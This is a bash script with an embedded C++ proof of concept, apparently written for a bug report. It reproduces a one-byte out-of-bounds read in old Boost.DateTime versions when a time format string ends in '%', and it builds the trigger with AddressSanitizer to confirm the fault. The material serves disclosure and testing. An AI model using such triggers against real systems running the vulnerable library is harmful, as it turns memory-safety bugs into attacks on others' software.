#!/usr/bin/env bash
# =============================================================================
# Self-contained PoC — Boost.DateTime out-of-bounds read in
# time_input_facet::get (boost/date_time/time_facet.hpp), triggered by a parse
# format string that ends in a bare '%'.
#
# This ONE file contains both the C++ proof-of-concept (embedded below as a
# heredoc) and the commands to build and run it, so it can be pasted directly
# into an email or issue tracker.
#
#   Affected: Boost ~1.35 - 1.54  (confirmed on 1.44.0)     Fixed in: 1.55
#   Class:    CWE-125 Out-of-bounds Read (off-by-one; missing end() check)
#
# Root cause (time_facet.hpp, time_input_facet::get, lines ~994-998):
#     const_itr itr(this->m_format.begin());
#     while (itr != this->m_format.end() && (sitr != stream_end)) {
#       if (*itr == '%') {
#         ++itr;                 // advance past '%' - can reach end()
#         if (*itr != '%') {     // <-- dereference with NO `itr != end()` check
#           switch(*itr) { ... } //     -> reads one element past m_format
#
# When the format is "%", the '%' is the final character: ++itr reaches end(),
# and the subsequent *itr reads one byte past the format buffer.
#
# Usage:
#   ./poc.sh                       # build with AddressSanitizer (default) + run
#   ./poc.sh plain                 # build WITHOUT sanitizer (shows the UB read
#                                  #   without an ASan abort)
#   BOOST=/path/to/boost_1_44_0 ./poc.sh     # point at a Boost 1.44 source tree
#
# Expected (asan):  AddressSanitizer: heap-buffer-overflow ... READ of size 1
#                   in ...time_input_facet::get ... time_facet.hpp:996
# =============================================================================
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
BOOST="${BOOST:-$HERE/../boost_1_44_0}"   # local Boost 1.44 headers + src
CXX="${CXX:-clang++}"
MODE="${1:-asan}"

if [ ! -d "$BOOST/boost/date_time" ]; then
    echo "ERROR: Boost 1.44 source not found at: $BOOST" >&2
    echo "Set the BOOST env var to a Boost 1.44 source tree, e.g." >&2
    echo "  BOOST=/path/to/boost_1_44_0 $0" >&2
    exit 1
fi

# Boost.DateTime needs these three compiled sources (greg month/weekday tables).
SRC=(
    "$BOOST/libs/date_time/src/gregorian/greg_month.cpp"
    "$BOOST/libs/date_time/src/gregorian/greg_weekday.cpp"
    "$BOOST/libs/date_time/src/gregorian/date_generators.cpp"
)

# Write the embedded C++ PoC to a temp file.
SRCFILE="$(mktemp /tmp/boost_datetime_poc.XXXXXX.cpp)"
BIN="$(mktemp /tmp/boost_datetime_poc.XXXXXX)"
trap 'rm -f "$SRCFILE" "$BIN"' EXIT

cat > "$SRCFILE" <<'CPP_EOF'
// PoC: Boost.DateTime OOB read in time_input_facet::get, format ending in '%'.
#include <cstdio>
#include <string>
#include <sstream>
#include <locale>
#include <boost/date_time/posix_time/posix_time.hpp>

using namespace boost::posix_time;

static void parse_with_format(const std::string& fmt, const char* label)
{
    std::printf("[*] %s: parsing with time_input_facet format = \"%s\"\n",
                label, fmt.c_str());
    std::stringstream ss;
    // Ownership of the facet is taken by the locale.
    ss.imbue(std::locale(ss.getloc(), new time_input_facet(fmt)));
    ss.str("2005-01-01 00:00:00");
    ptime pt(not_a_date_time);
    ss >> pt;                       // <-- get() walks the format; OOB read here
    std::printf("    parsed value: %s\n", to_simple_string(pt).c_str());
}

int main()
{
    // Control: a well-formed format does NOT over-read.
    parse_with_format("%Y-%m-%d %H:%M:%S", "control (well-formed)");

    // Trigger: format ends in a bare '%'  -> out-of-bounds read.
    // (Under AddressSanitizer this aborts here with heap-buffer-overflow.)
    parse_with_format("%", "TRIGGER (format ends in '%')");

    std::printf("[!] reached end without a crash "
                "(no sanitizer, or a patched Boost >= 1.55)\n");
    return 0;
}
CPP_EOF

# -D_GLIBCXX_USE_CXX11_ABI=0 : lets the 2010-era Boost headers compile cleanly
#                              against a modern libstdc++.
COMMON=(-std=c++03 -D_GLIBCXX_USE_CXX11_ABI=0 -g -O1 -I"$BOOST")

if [ "$MODE" = "plain" ]; then
    echo "[*] building WITHOUT sanitizer ..."
    "$CXX" "${COMMON[@]}" "$SRCFILE" "${SRC[@]}" -o "$BIN" || exit 1
    echo "[*] running ..."
    "$BIN"
else
    echo "[*] building with AddressSanitizer ..."
    "$CXX" "${COMMON[@]}" -fsanitize=address -fno-omit-frame-pointer \
        "$SRCFILE" "${SRC[@]}" -o "$BIN" || exit 1
    echo "[*] running (expect: AddressSanitizer heap-buffer-overflow) ..."
    ASAN_OPTIONS=abort_on_error=0 "$BIN"
fi
